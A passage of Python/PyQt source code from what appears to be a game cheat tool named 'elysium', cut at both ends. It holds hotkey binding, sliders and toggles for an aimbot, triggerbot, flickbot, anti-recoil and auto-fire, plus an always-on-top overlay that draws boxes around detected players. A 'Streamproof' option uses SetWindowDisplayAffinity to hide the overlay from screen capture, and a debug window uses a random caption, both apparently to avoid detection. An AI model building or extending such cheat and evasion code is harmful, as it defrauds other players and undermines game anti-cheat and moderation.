        dont_launch_overlays = secretconfig['dont_launch_overlays']
        use_mss = secretconfig['use_mss']
        hide_masks = secretconfig['hide_masks']

        self.auto_save_config()

    def start_select_hotkey(self):
        self.is_selecting_hotkey = True
        self.Keybind = None
        self.btn_hotkey.setText("...")
        threading.Thread(target=self.listen_for_hotkey).start()
        self.auto_save_config()

    def listen_for_hotkey(self):
        while self.is_selecting_hotkey:
            for vk in range(256):
                if win32api.GetKeyState(vk) in (-127, -128):
                    self.Keybind = vk
                    self.is_selecting_hotkey = False
                    key_name_converted = KEY_NAMES.get(self.Keybind, f"0x{self.Keybind:02X}")
                    self.btn_hotkey.setText(f"{key_name_converted}")
                    self.auto_save_config()
                    break

    def start_select_hotkey2(self):
        self.is_selecting_hotkey2 = True
        self.Keybind2 = None
        self.btn_hotkey2.setText("...")
        threading.Thread(target=self.listen_for_hotkey2).start()
        self.auto_save_config()

    def listen_for_hotkey2(self):
        while self.is_selecting_hotkey2:
            for vk in range(256):
                if win32api.GetKeyState(vk) in (-127, -128):
                    self.Keybind2 = vk
                    self.is_selecting_hotkey2 = False
                    key_name_converted2 = KEY_NAMES.get(self.Keybind2, f"0x{self.Keybind2:02X}")
                    self.btn_hotkey2.setText(f"{key_name_converted2}")
                    self.auto_save_config()
                    break

    def start_select_hotkey3(self):
        self.is_selecting_hotkey3 = True
        self.Auto_Fire_Keybind = None
        self.btn_hotkey3.setText("...")
        threading.Thread(target=self.listen_for_hotkey3).start()
        self.auto_save_config()

    def listen_for_hotkey3(self):
        while self.is_selecting_hotkey3:
            for vk in range(256):
                if win32api.GetKeyState(vk) in (-127, -128):
                    self.Auto_Fire_Keybind = vk
                    self.is_selecting_hotkey3 = False
                    key_name_converted3 = KEY_NAMES.get(self.Auto_Fire_Keybind, f"0x{self.Auto_Fire_Keybind:02X}")
                    self.btn_hotkey3.setText(f"{key_name_converted3}")
                    self.auto_save_config()
                    break

    def start_select_hotkey4(self):
        self.is_selecting_hotkey4 = True
        self.Flickbot_Keybind = None
        self.btn_hotkey4.setText("...")
        threading.Thread(target=self.listen_for_hotkey4).start()
        self.auto_save_config()

    def listen_for_hotkey4(self):
        while self.is_selecting_hotkey4:
            for vk in range(256):
                if win32api.GetKeyState(vk) in (-127, -128):
                    self.Flickbot_Keybind = vk
                    self.is_selecting_hotkey4 = False
                    key_name_converted4 = KEY_NAMES.get(self.Flickbot_Keybind, f"0x{self.Flickbot_Keybind:02X}")
                    self.btn_hotkey4.setText(f"{key_name_converted4}")
                    self.auto_save_config()
                    break

    def start_select_hotkey_slot1(self):
        self.is_selecting_hotkey_slot1 = True
        self.Slot1_Keybind = None
        self.btn_hotkey_slot1.setText("...")
        threading.Thread(target=self.listen_for_hotkey_slot1).start()
        self.auto_save_config()

    def listen_for_hotkey_slot1(self):
        while self.is_selecting_hotkey_slot1:
            for vk in range(256):
                if win32api.GetKeyState(vk) in (-127, -128):
                    self.Slot1_Keybind = vk
                    self.is_selecting_hotkey_slot1 = False
                    key_name_converted_slot1 = KEY_NAMES.get(self.Slot1_Keybind, f"0x{self.Slot1_Keybind:02X}")
                    self.btn_hotkey_slot1.setText(f"{key_name_converted_slot1}")
                    self.auto_save_config()
                    break

    # Slot 2
    def start_select_hotkey_slot2(self):
        self.is_selecting_hotkey_slot2 = True
        self.Slot2_Keybind = None
        self.btn_hotkey_slot2.setText("...")
        threading.Thread(target=self.listen_for_hotkey_slot2).start()
        self.auto_save_config()

    def listen_for_hotkey_slot2(self):
        while self.is_selecting_hotkey_slot2:
            for vk in range(256):
                if win32api.GetKeyState(vk) in (-127, -128):
                    self.Slot2_Keybind = vk
                    self.is_selecting_hotkey_slot2 = False
                    key_name_converted_slot2 = KEY_NAMES.get(self.Slot2_Keybind, f"0x{self.Slot2_Keybind:02X}")
                    self.btn_hotkey_slot2.setText(f"{key_name_converted_slot2}")
                    self.auto_save_config()
                    break

    # Slot 3
    def start_select_hotkey_slot3(self):
        self.is_selecting_hotkey_slot3 = True
        self.Slot3_Keybind = None
        self.btn_hotkey_slot3.setText("...")
        threading.Thread(target=self.listen_for_hotkey_slot3).start()
        self.auto_save_config()

    def listen_for_hotkey_slot3(self):
        while self.is_selecting_hotkey_slot3:
            for vk in range(256):
                if win32api.GetKeyState(vk) in (-127, -128):
                    self.Slot3_Keybind = vk
                    self.is_selecting_hotkey_slot3 = False
                    key_name_converted_slot3 = KEY_NAMES.get(self.Slot3_Keybind, f"0x{self.Slot3_Keybind:02X}")
                    self.btn_hotkey_slot3.setText(f"{key_name_converted_slot3}")
                    self.auto_save_config()
                    break

    # Slot 4
    def start_select_hotkey_slot4(self):
        self.is_selecting_hotkey_slot4 = True
        self.Slot4_Keybind = None
        self.btn_hotkey_slot4.setText("...")
        threading.Thread(target=self.listen_for_hotkey_slot4).start()
        self.auto_save_config()

    def listen_for_hotkey_slot4(self):
        while self.is_selecting_hotkey_slot4:
            for vk in range(256):
                if win32api.GetKeyState(vk) in (-127, -128):
                    self.Slot4_Keybind = vk
                    self.is_selecting_hotkey_slot4 = False
                    key_name_converted_slot4 = KEY_NAMES.get(self.Slot4_Keybind, f"0x{self.Slot4_Keybind:02X}")
                    self.btn_hotkey_slot4.setText(f"{key_name_converted_slot4}")
                    self.auto_save_config()
                    break

    # Slot 5
    def start_select_hotkey_slot5(self):
        self.is_selecting_hotkey_slot5 = True
        self.Slot5_Keybind = None
        self.btn_hotkey_slot5.setText("...")
        threading.Thread(target=self.listen_for_hotkey_slot5).start()
        self.auto_save_config()

    def listen_for_hotkey_slot5(self):
        while self.is_selecting_hotkey_slot5:
            for vk in range(256):
                if win32api.GetKeyState(vk) in (-127, -128):
                    self.Slot5_Keybind = vk
                    self.is_selecting_hotkey_slot5 = False
                    key_name_converted_slot5 = KEY_NAMES.get(self.Slot5_Keybind, f"0x{self.Slot5_Keybind:02X}")
                    self.btn_hotkey_slot5.setText(f"{key_name_converted_slot5}")
                    self.auto_save_config()
                    break

    # Slot 6
    def start_select_hotkey_slot6(self):
        self.is_selecting_hotkey_slot6 = True
        self.Slot6_Keybind = None
        self.btn_hotkey_slot6.setText("...")
        threading.Thread(target=self.listen_for_hotkey_slot6).start()
        self.auto_save_config()

    def listen_for_hotkey_slot6(self):
        while self.is_selecting_hotkey_slot6:
            for vk in range(256):
                if win32api.GetKeyState(vk) in (-127, -128):
                    self.Slot6_Keybind = vk
                    self.is_selecting_hotkey_slot6 = False
                    key_name_converted_slot6 = KEY_NAMES.get(self.Slot6_Keybind, f"0x{self.Slot6_Keybind:02X}")
                    self.btn_hotkey_slot6.setText(f"{key_name_converted_slot6}")
                    self.auto_save_config()
                    break

    def calculate_color(self, hue, opacity, lightness):
        overlay_color = QColor.fromHsl(235, 87, 78)
        overlay_color.setAlpha(100)
        return overlay_color

    def on_slider_value_change(self, value):
        self.auto_save_config()
        tick_position = round(value / 10) * 10
        self.slider.setValue(tick_position)
        global Fov_Size
        Fov_Size = tick_position
        self.Fov_Size_label.setText(f'FOV: {str(Fov_Size)}')

    def on_slider0_value_change(self, value):
        self.auto_save_config()
        tick_position0 = round(value / 1) * 1
        self.slider0.setValue(tick_position0)
        global Confidence
        Confidence = tick_position0
        self.Confidence_label.setText(f'Confidence: {str(Confidence)}%')

    def on_slider_fps_value_change(self, value):
        self.auto_save_config()
        tick_position0r = round(value / 1) * 1
        self.slider_fps.setValue(tick_position0r)
        global Model_FPS
        Model_FPS = tick_position0r
        self.fps_label.setText(f'Max FPS: {str(Model_FPS)}')

    def on_slider3_value_change(self, value):
        self.auto_save_config()
        #tick_position3 = round(value)
        tick_position3 = round(value / 5) * 5
        self.slider3.setValue(tick_position3)
        global Aim_Smooth
        Aim_Smooth = tick_position3
        self.Aim_Smooth_label.setText(f'AI Strength: {str(Aim_Smooth)}')

    def on_slider4_value_change(self, value):
        self.auto_save_config()
        tick_position4 = round(value / 1) * 1
        self.slider4.setValue(tick_position4)
        global Max_Detections
        Max_Detections = tick_position4
        self.Max_Detections_label.setText(f'Max Detections: {str(Max_Detections)}')

    def on_slider5_value_change(self, value):
        self.auto_save_config()
        tick_position5 = round(value / 1) * 1
        self.slider5.setValue(tick_position5)
        global Auto_Fire_Fov_Size
        Auto_Fire_Fov_Size = tick_position5
        self.Auto_Fire_Fov_Size_label.setText(f'FOV Size: {str(Auto_Fire_Fov_Size)}')

    def on_slider60_value_change(self, value):
        self.auto_save_config()
        tick_position60 = round(value / 1) * 1
        self.slider60.setValue(tick_position60)
        global AntiRecoil_Strength
        AntiRecoil_Strength = tick_position60
        self.AntiRecoil_Strength_label.setText(f'Strength: {str(AntiRecoil_Strength)}')

    def on_slider_slot1_value_change(self, value):
        self.auto_save_config()
        tick_position = round(value / 10) * 10
        self.slider_slot1.setValue(tick_position)
        global Fov_Size_Slot1
        Fov_Size_Slot1 = tick_position
        self.Fov_Size_label_slot1.setText(f'FOV: {str(Fov_Size_Slot1)}')

    def on_slider_slot2_value_change(self, value):
        self.auto_save_config()
        tick_position = round(value / 10) * 10
        self.slider_slot2.setValue(tick_position)
        global Fov_Size_Slot2
        Fov_Size_Slot2 = tick_position
        self.Fov_Size_label_slot2.setText(f'FOV: {str(Fov_Size_Slot2)}')

    def on_slider_slot3_value_change(self, value):
        self.auto_save_config()
        tick_position = round(value / 10) * 10
        self.slider_slot3.setValue(tick_position)
        global Fov_Size_Slot3
        Fov_Size_Slot3 = tick_position
        self.Fov_Size_label_slot3.setText(f'FOV: {str(Fov_Size_Slot3)}')

    def on_slider_slot4_value_change(self, value):
        self.auto_save_config()
        tick_position = round(value / 10) * 10
        self.slider_slot4.setValue(tick_position)
        global Fov_Size_Slot4
        Fov_Size_Slot4 = tick_position
        self.Fov_Size_label_slot4.setText(f'FOV: {str(Fov_Size_Slot4)}')

    def on_slider_slot5_value_change(self, value):
        self.auto_save_config()
        tick_position = round(value / 10) * 10
        self.slider_slot5.setValue(tick_position)
        global Fov_Size_Slot5
        Fov_Size_Slot5 = tick_position
        self.Fov_Size_label_slot5.setText(f'FOV: {str(Fov_Size_Slot5)}')

    def on_flick_scope_slider_value_change(self, value):
        self.auto_save_config()
        tick_position_flick_scope = round(value / 1) * 1
        self.flick_scope_slider.setValue(tick_position_flick_scope)
        global Flick_Scope_Sens
        Flick_Scope_Sens = tick_position_flick_scope
        self.flick_scope_label.setText(f'Flick Strength: {str(Flick_Scope_Sens)}%')

    def on_flick_cool_slider_value_change(self, value):
        self.auto_save_config()
        tick_position_cooldown = round(value / 5) * 5 / 100.0
        self.flick_cool_slider.setValue(int(tick_position_cooldown * 100))
        global Flick_Cooldown
        Flick_Cooldown = tick_position_cooldown
        self.flick_cool_label.setText(f'Cool Down: {str(Flick_Cooldown)}s')

    def on_flick_delay_slider_value_change(self, value):
        self.auto_save_config()
        tick_position_delay = value / 1000.0
        self.flick_delay_slider.setValue(int(tick_position_delay * 1000))
        global Flick_Delay
        Flick_Delay = tick_position_delay
        self.flick_delay_label.setText(f'Shot Delay: {str(Flick_Delay)}s')

    def on_slider6_value_change(self, value):
        self.auto_save_config()
        tick_position6 = round(value / 1) * 1
        self.slider6.setValue(tick_position6)
        global Auto_Fire_Confidence
        Auto_Fire_Confidence = tick_position6
        self.Auto_Fire_Confidence_label.setText(f'Confidence: {str(Auto_Fire_Confidence)}%')

    def toggle_checkbox1(self, state):
        self.auto_save_config()
        # Update the global variable Enable_Aim
        global Enable_Aim
        Enable_Aim = state == Qt.Unchecked

        # Toggle the state of the checkbox
        self.Enable_Aim_checkbox.setChecked(not Enable_Aim)

        QApplication.processEvents()
        self.auto_save_config()

    def on_checkbox_state_change(self, state):
        self.auto_save_config()
        if self.sender() == self.Enable_Aim_checkbox:
            global Enable_Aim
            Enable_Aim = (state == Qt.Checked)
        # if self.sender() == self.Streamproof_checkbox:
        # 	global Streamproof
        # 	Streamproof = (state == Qt.Checked)
        if self.sender() == self.Enable_Aim_Slot1_checkbox:
            global Enable_Aim_Slot1
            Enable_Aim_Slot1 = (state == Qt.Checked)

        if self.sender() == self.Enable_Aim_Slot2_checkbox:
            global Enable_Aim_Slot2
            Enable_Aim_Slot2 = (state == Qt.Checked)

        if self.sender() == self.Enable_Aim_Slot3_checkbox:
            global Enable_Aim_Slot3
            Enable_Aim_Slot3 = (state == Qt.Checked)

        if self.sender() == self.Enable_Aim_Slot4_checkbox:
            global Enable_Aim_Slot4
            Enable_Aim_Slot4 = (state == Qt.Checked)

        if self.sender() == self.Enable_Aim_Slot5_checkbox:
            global Enable_Aim_Slot5
            Enable_Aim_Slot5 = (state == Qt.Checked)

        if self.sender() == self.Enable_Slots_checkbox:
            global Enable_Slots
            Enable_Slots = (state == Qt.Checked)

        if self.sender() == self.Show_Fov_checkbox:
            global Show_Fov
            Show_Fov = (state == Qt.Checked)

        if self.sender() == self.Show_Crosshair_checkbox:
            global Show_Crosshair
            Show_Crosshair = (state == Qt.Checked)

        if self.sender() == self.Show_CMD_checkbox:
            kernel32 = ctypes.WinDLL('kernel32')
            user32 = ctypes.WinDLL('user32')
            hWnd = kernel32.GetConsoleWindow()
            SW_HIDE = 0
            SW_SHOW = 5	
            user32.ShowWindow(hWnd, SW_HIDE if user32.IsWindowVisible(hWnd) else SW_SHOW)

        if self.sender() == self.Show_Debug_checkbox:
            global Show_Debug
            Show_Debug = (state == Qt.Checked)
            if Show_Debug == False:
                hwnd = win32gui.FindWindow(None, random_caption1)
                win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
            else:
                hwnd = win32gui.FindWindow(None, random_caption1)
                win32gui.ShowWindow(hwnd, win32con.SW_SHOWNORMAL)

        if self.sender() == self.Show_FPS_checkbox:
            global Show_FPS
            Show_FPS = (state == Qt.Checked)

        if self.sender() == self.Enable_TriggerBot_checkbox:
            global Enable_TriggerBot
            Enable_TriggerBot = (state == Qt.Checked)

        if self.sender() == self.Show_Detections_checkbox:
            global Show_Detections
            Show_Detections = (state == Qt.Checked)

        if self.sender() == self.Show_Aimline_checkbox:
            global Show_Aimline
            Show_Aimline = (state == Qt.Checked)

        if self.sender() == self.Require_Keybind_checkbox:
            global Require_Keybind
            Require_Keybind = (state == Qt.Checked)

        if self.sender() == self.Controller_On_checkbox:
            global Controller_On
            Controller_On = (state == Qt.Checked)

        if self.sender() == self.CupMode_On_checkbox:
            global CupMode_On
            CupMode_On = (state == Qt.Checked)

        if self.sender() == self.Reduce_Bloom_checkbox:
            global Reduce_Bloom
            Reduce_Bloom = (state == Qt.Checked)

        if self.sender() == self.Require_ADS_checkbox:
            global Require_ADS
            Require_ADS = (state == Qt.Checked)

        if self.sender() == self.AntiRecoil_On_checkbox:
            global AntiRecoil_On
            AntiRecoil_On = (state == Qt.Checked)

        if self.sender() == self.Enable_Flick_checkbox:
            global Enable_Flick_Bot
            Enable_Flick_Bot = (state == Qt.Checked)

        if self.sender() == self.Use_Hue_checkbox:
            global Use_Hue
            Use_Hue = (state == Qt.Checked)

        if self.sender() == self.Use_Model_Class_checkbox:
            global Use_Model_Class
            Use_Model_Class = (state == Qt.Checked)

        self.auto_save_config()

class HueUpdaterThread(threading.Thread):
    def __init__(self, parent):
        super().__init__()
        self.parent = parent
        self.hue = 0
        self.running = True

    def run(self):
        while self.running:
            # Update hue value
            self.hue = (self.hue + 1) % 360
            time.sleep(0.025)  # Adjust the sleep time for smoother animation

    def stop(self):
        self.running = False


class DetectionBox(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(Qt.Tool | Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint | Qt.WindowTransparentForInput | Qt.WindowDoesNotAcceptFocus)
        self.setAttribute(Qt.WA_TranslucentBackground)
        self.setAttribute(Qt.WA_TransparentForMouseEvents)
        self.setAttribute(Qt.WA_ShowWithoutActivating)
        self.load_config()
        global Fov_Size
        self.Fov_Size = Fov_Size
        self.setGeometry(int(screen_res_X - self.Fov_Size+2) // 2, int(screen_res_Y - self.Fov_Size+2) // 2, self.Fov_Size+25, self.Fov_Size+25)
        window_handle = int(self.winId())
        user32.SetWindowDisplayAffinity(window_handle, 0x00000011) if Streamproof else user32.SetWindowDisplayAffinity(window_handle, 0x00000000)
        self.detected_players = []

        self.hue_updater = HueUpdaterThread(self)
        self.hue_updater.start()

        self.current_slot_selectedd = 1
        self.update_fov_size()

        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update)
        self.timer.start(100)
        self.start_time = time.perf_counter()

        self.key_states = {key: False for key in [Slot1_Keybind, Slot2_Keybind, Slot3_Keybind, Slot4_Keybind, Slot5_Keybind, Slot6_Keybind] if key is not None}

        self.key_check_timer = QTimer(self)
        self.key_check_timer.timeout.connect(self.check_key_states)
        self.key_check_timer.start(10)

    def update_detected_players(self, detected_players):
        self.detected_players = detected_players
        self.update()

    def clear_detected_players(self):
        self.detected_players = []
        self.update()

    def fps(self):
        return int(1.5 / (time.perf_counter() - self.start_time))

    def load_config(self):
        with open('./config.json', 'r') as infile:
            config_settings = jsond.load(infile)

        self.Use_Hue = config_settings['Use_Hue']

        # self.fov_color = QColor(
        # 	config_settings.get("RGBA_Value", {}).get("red", 255),
        # 	config_settings.get("RGBA_Value", {}).get("green", 255),
        # 	config_settings.get("RGBA_Value", {}).get("blue", 255),
        # 	config_settings.get("RGBA_Value", {}).get("opacity", 255)
        # )

        self.fov_color = QColor(255,255,255,255)
        self.lightness = config_settings.get("RGBA_Value", {}).get("lightness", 128)  # Add this line

        self.fov_color_outline = QColor(
            0,
            0,
            0,
            config_settings.get("RGBA_Value", {}).get("opacity", 255)
        )

        # self.watermark_color = QColor(
        # 	config_settings.get("RGBA_Value", {}).get("red", 255),
        # 	config_settings.get("RGBA_Value", {}).get("green", 255),
        # 	config_settings.get("RGBA_Value", {}).get("blue", 255),
        # 	config_settings.get("RGBA_Value", {}).get("opacity", 255)
        # )
        self.watermark_color = QColor(151,159,251,255)
        self.watermark_color_outline = QColor(
            0,
            0,
            0,
            0
        )

        self.crosshair_dot_color = QColor(
            config_settings.get("RGBA_Value", {}).get("red", 255),
            config_settings.get("RGBA_Value", {}).get("green", 255),
            config_settings.get("RGBA_Value", {}).get("blue", 255),
            255
        )
        self.crosshair_color = QColor(255, 255, 255, 255)  # Crosshair color with full opacity

        self.fov_thickness = 1.5
        self.watermark_thickness = 0.5
        self.crosshair_thickness = 1.5

    def BlueADS(self):
        return True if win32api.GetKeyState(win32con.VK_RBUTTON) in (-127, -128) else False
        pass

    def BlueFire(self):
        return True if win32api.GetKeyState(win32con.VK_LBUTTON) in (-127, -128) else False
        pass

    def check_key_states(self):
        if Enable_Slots:
            # Check each key and update states
            for key, slot in zip([Slot1_Keybind, Slot2_Keybind, Slot3_Keybind, Slot4_Keybind, Slot5_Keybind, Slot6_Keybind], range(1, 7)):
                if key is not None:
                    # Check if the key is in self.key_states
                    if key not in self.key_states:
                        print(f"[elysium] -> key {key} not found in key_states")
                        self.key_states[key] = False  # Initialize the state if it's missing
                    current_state = win32api.GetAsyncKeyState(key) < 0
                    if current_state and not self.key_states[key]:
                        # Key has been pressed down
                        self.current_slot_selectedd = slot
                        self.update_fov_size()
                    self.key_states[key] = current_state

        if not Enable_Slots:
            self.Fov_Size = Fov_Size

        self.update()

    def update_fov_size(self):
        if Enable_Slots:
            if self.current_slot_selectedd is not None:
                if self.current_slot_selectedd == 1:
                    self.Fov_Size = Fov_Size_Slot1
                elif self.current_slot_selectedd == 2:
                    self.Fov_Size = Fov_Size_Slot2
                elif self.current_slot_selectedd == 3:
                    self.Fov_Size = Fov_Size_Slot3
                elif self.current_slot_selectedd == 4:
                    self.Fov_Size = Fov_Size_Slot4
                elif self.current_slot_selectedd == 5:
                    self.Fov_Size = Fov_Size_Slot5
                elif self.current_slot_selectedd == 6:
                    self.Fov_Size = 15
            else:
                self.Fov_Size = Fov_Size
        if not Enable_Slots:
            self.Fov_Size = Fov_Size

        self.setGeometry(int(screen_res_X-4 - self.Fov_Size+2) // 2, int(screen_res_Y-4 - self.Fov_Size+2) // 2, self.Fov_Size+25, self.Fov_Size+25)
        self.update()

    def paintEvent(self, event):

        painter = QPainter(self)
        painter.setRenderHint(QPainter.Antialiasing)
        if not Enable_Slots:
            self.setGeometry(int(screen_res_X-4 - self.Fov_Size+2) // 2, int(screen_res_Y-4 - self.Fov_Size+2) // 2, self.Fov_Size+25, self.Fov_Size+25)
        self.load_config()

        font_size_px = 11
        font = QFont("Verdana")
        font.setPixelSize(font_size_px)
        painter.setFont(font)

        if CupMode_On:
            pass
        elif CupMode_On == False:

            if self.current_slot_selectedd == 6:
                if Enable_Slots:
                    pass
            else:
                if Show_Fov:
                    center_x = self.Fov_Size // 2
                    center_y = self.Fov_Size // 2
                    fov_radius = self.Fov_Size // 2 - self.fov_thickness // 2
                    if Use_Hue:
                        fov_thickness = 1.1
                        num_sections = 360
                        section_angle = 360 / num_sections

                        for i in range(num_sections):
                            hue = (self.hue_updater.hue + i) % 360
                            color = QColor.fromHsv(hue, 175, 255)
                            pen = QPen(color, fov_thickness, Qt.SolidLine)
                            painter.setPen(pen)
                            start_angle = i * section_angle * 16
                            end_angle = (i + 1) * section_angle * 16
                            rect = QRect(int(center_x + 2 - fov_radius), int(center_y + 2 - fov_radius), int(2 * fov_radius), int(2 * fov_radius))
                            painter.drawArc(rect, int(start_angle), int(section_angle * 16))
                    else:
                        fov_rect = QRectF(center_x+2 - fov_radius, center_y+2 - fov_radius, 2 * fov_radius, 2 * fov_radius)
                        painter.setPen(QPen(self.fov_color, self.fov_thickness, Qt.SolidLine))
                        painter.drawEllipse(fov_rect)
                        if Visual_Outlines:
                            inner_radius = fov_radius - 1.0
                            outer_radius = fov_radius + 1.0
                            pen_inner = QPen(self.fov_color_outline, 0.6)
                            pen_outer = QPen(self.fov_color_outline, 0.6)
                            painter.setPen(pen_inner)
                            inner_rect = QRect(int(center_x+2 - inner_radius), int(center_y+2 - inner_radius), int(2 * inner_radius), int(2 * inner_radius))
                            painter.drawEllipse(inner_rect)
                            painter.setPen(pen_outer)
                            outer_rect = QRect(int(center_x+2 - outer_radius), int(center_y+2 - outer_radius), int(2 * outer_radius), int(2 * outer_radius))
                            painter.drawEllipse(outer_rect)

            if Show_Crosshair:
                if self.BlueFire():
                    pen_crosshair_ads = QPen(QColor(255, 255, 255, 255), 0.3, Qt.SolidLine)
                    painter.setPen(pen_crosshair_ads)
                    painter.setRenderHint(QPainter.Antialiasing, False)
                    center_x = self.width() // 2 -11
                    center_y = self.height() // 2 -11
                    painter.drawLine(center_x, center_y + 3, center_x, center_y - 3)
                    painter.drawLine(center_x - 3, center_y, center_x + 3, center_y)
                else:
                    if self.BlueADS():
                        pen_crosshair_ads = QPen(QColor(255, 255, 255, 255), 0.5, Qt.SolidLine)
                        painter.setPen(pen_crosshair_ads)
                        painter.setRenderHint(QPainter.Antialiasing, False)
                        center_x = self.width() // 2 -11
                        center_y = self.height() // 2 -11
                        painter.drawLine(center_x, center_y + 5, center_x, center_y - 5)
                        painter.drawLine(center_x - 5, center_y, center_x + 5, center_y)
                    else:
                        pen_crosshair = QPen(QColor(255, 255, 255, 255), 1.1, Qt.SolidLine)
                        painter.setPen(pen_crosshair)
                        painter.setRenderHint(QPainter.Antialiasing, False)
                        center_x = self.width() // 2 -11
                        center_y = self.height() // 2 -11
                        painter.drawLine(center_x, center_y + 7, center_x, center_y - 7)
                        painter.drawLine(center_x - 7, center_y, center_x + 7, center_y)
                        dot_radius = 1
                        if Use_Hue:
                            hue = self.hue_updater.hue
                            dot_pen = QPen(QColor.fromHsv(hue, 255, 255), dot_radius * 2)
                        else:
                            dot_pen = QPen(self.crosshair_dot_color, dot_radius * 2)
                        painter.setPen(dot_pen)
                        painter.drawPoint(center_x, center_y)
                        pen_crosshair_outline = QPen(Qt.black, 1, Qt.SolidLine)  # Adjust thickness as needed
                        painter.setPen(pen_crosshair_outline)
                        outline_offset = 1
                        painter.drawLine(center_x - outline_offset, center_y + 8, center_x - outline_offset, center_y - 8)
                        painter.drawLine(center_x - 8, center_y - outline_offset, center_x + 8, center_y - outline_offset)
                        painter.drawLine(center_x + outline_offset, center_y + 8, center_x + outline_offset, center_y - 8)
                        painter.drawLine(center_x - 8, center_y + outline_offset, center_x + 8, center_y + outline_offset)
                        painter.drawLine(center_x - outline_offset, center_y - 8, center_x + outline_offset, center_y - 8)
                        painter.drawLine(center_x - outline_offset, center_y + 8, center_x + outline_offset, center_y + 8)
                        painter.drawLine(center_x - 8, center_y - outline_offset, center_x - 8, center_y + outline_offset)
                        painter.drawLine(center_x + 8, center_y - outline_offset, center_x + 8, center_y + outline_offset)
                    self.update()

            if self.current_slot_selectedd == 6:
                if Enable_Slots:
                    pass
            else:
                if Show_Detections:
                    for player in self.detected_players:

                        x1, y1, x2, y2 = player['x1'], player['y1'], player['x2'], player['y2']
                        head1, head2 = player['head1'], player['head2']

                        #self.update_fov_size()

                        width = x2 - x1
                        height = y2 - y1

                        margin_factor = 0.1
                        margin_x = width * margin_factor
                        margin_y = height * margin_factor

                        x1 -= margin_x
                        y1 -= margin_y
                        x2 += margin_x
                        y2 += margin_y
                        width = x2 - x1
                        height = y2 - y1
                        x1, y1, x2, y2 = int(x1), int(y1), int(x2), int(y2)
                        head1, head2 = int(head1), int(head2)

                        if Box_type == "Corner":
                            if Use_Hue:
                                hue = int(time.time() * 150) % 360
                                color = QColor.fromHsv(hue, 255, 255, 255)
                                painter.setPen(QPen(color, 1))
                            else:
                                painter.setPen(QPen(self.fov_color, 1))

                            corner_length = int(min(width, height) * 0.1) 

                            if Visual_Outlines:
                                painter.setPen(QPen(Qt.black, 1))
                                painter.setRenderHint(QPainter.Antialiasing, False)
                                # Top-left corner (outside)
                                painter.drawLine(x1 - 1, y1 - 1, x1 + corner_length + 1, y1 - 1)
                                painter.drawLine(x1 - 1, y1 - 1, x1 - 1, y1 + corner_length + 1)
                                # Top-right corner (outside)
                                painter.drawLine(x2 + 1, y1 - 1, x2 - corner_length - 1, y1 - 1)
                                painter.drawLine(x2 + 1, y1 - 1, x2 + 1, y1 + corner_length + 1)
                                # Bottom-left corner (outside)
                                painter.drawLine(x1 - 1, y2 + 1, x1 + corner_length + 1, y2 + 1)
                                painter.drawLine(x1 - 1, y2 + 1, x1 - 1, y2 - corner_length - 1)
                                # Bottom-right corner (outside)
                                painter.drawLine(x2 + 1, y2 + 1, x2 - corner_length - 1, y2 + 1)
                                painter.drawLine(x2 + 1, y2 + 1, x2 + 1, y2 - corner_length - 1)

                            if Use_Hue:
                                hue = int(time.time() * 150) % 360
                                color = QColor.fromHsv(hue, 255, 255, 255)
                                painter.setPen(QPen(color, 2))
                            else:
                                painter.setPen(QPen(QColor(255,255,255,255), 1))
                            painter.drawLine(x1, y1, x1 + corner_length, y1)
                            painter.drawLine(x1, y1, x1, y1 + corner_length)
                            painter.drawLine(x2, y1, x2 - corner_length, y1)
                            painter.drawLine(x2, y1, x2, y1 + corner_length)
                            painter.drawLine(x1, y2, x1 + corner_length, y2)
                            painter.drawLine(x1, y2, x1, y2 - corner_length)
                            painter.drawLine(x2, y2, x2 - corner_length, y2)
                            painter.drawLine(x2, y2, x2, y2 - corner_length)

                            # if Visual_Outlines:
                            # 	painter.setPen(QPen(Qt.black, 1))
                            # 	painter.setRenderHint(QPainter.Antialiasing, False)
                            # 	# Top-left corner (inside)
                            # 	painter.drawLine(x1 + 1, y1 + 1, x1 + corner_length - 1, y1 + 1)
                            # 	painter.drawLine(x1 + 1, y1 + 1, x1 + 1, y1 + corner_length - 1)
                            # 	# Top-right corner (inside)
                            # 	painter.drawLine(x2 - 1, y1 + 1, x2 - corner_length + 1, y1 + 1)
                            # 	painter.drawLine(x2 - 1, y1 + 1, x2 - 1, y1 + corner_length - 1)
                            # 	# Bottom-left corner (inside)
                            # 	painter.drawLine(x1 + 1, y2 - 1, x1 + corner_length - 1, y2 - 1)
                            # 	painter.drawLine(x1 + 1, y2 - 1, x1 + 1, y2 - corner_length + 1)
                            # 	# Bottom-right corner (inside)
                            # 	painter.drawLine(x2 - 1, y2 - 1, x2 - corner_length + 1, y2 - 1)
                            # 	painter.drawLine(x2 - 1, y2 - 1, x2 - 1, y2 - corner_length + 1)
                        elif Box_type == "Regular":
                            if Use_Hue:
                                hue = int(time.time() * 150) % 360
                                color = QColor.fromHsv(hue, 255, 255, 55)
                                painter.setPen(QPen(color, 2))
                            else:
                                painter.setPen(QPen(self.fov_color, 2))

                            # Draw the rectangle using lines
                            painter.drawLine(x1, y1, x2, y1)  # Top edge
                            painter.drawLine(x2, y1, x2, y2)  # Right edge
                            painter.drawLine(x2, y2, x1, y2)  # Bottom edge
                            painter.drawLine(x1, y2, x1, y1)
                        elif Box_type == "Filled":
                            if Use_Hue:
                                hue = int(time.time() * 150) % 360
                                color = QColor.fromHsv(hue, 255, 255, 55)
                                painter.setPen(QPen(color, 2))
                            else:
                                painter.setPen(QPen(QColor(151, 158, 248, int(255 * 0.75)), 2))

                            fill_color = QColor(151, 158, 248, int(255 * 0.25))
                            painter.setBrush(QBrush(fill_color, Qt.SolidPattern))

                            points = [QPoint(x1, y1), QPoint(x2, y1), QPoint(x2, y2), QPoint(x1, y2)]

                            painter.drawPolygon(QPolygon(points))

                            # # Draw the outline of the rectangle using lines
                            # painter.drawLine(x1, y1, x2, y1)  # Top edge
                            # painter.drawLine(x2, y1, x2, y2)  # Right edge
                            # painter.drawLine(x2, y2, x1, y2)  # Bottom edge
                            # painter.drawLine(x1, y2, x1, y1)
                if Show_Aimline:
                    for player in self.detected_players:
                        head1, head2 = player['head1'], player['head2']  # Extract head1 and head2
                        # self.update_fov_size()
                        center_x, center_y = self.Fov_Size // 2 + 1, self.Fov_Size // 2 + 1

                        # Adjust thickness for smaller outline lines
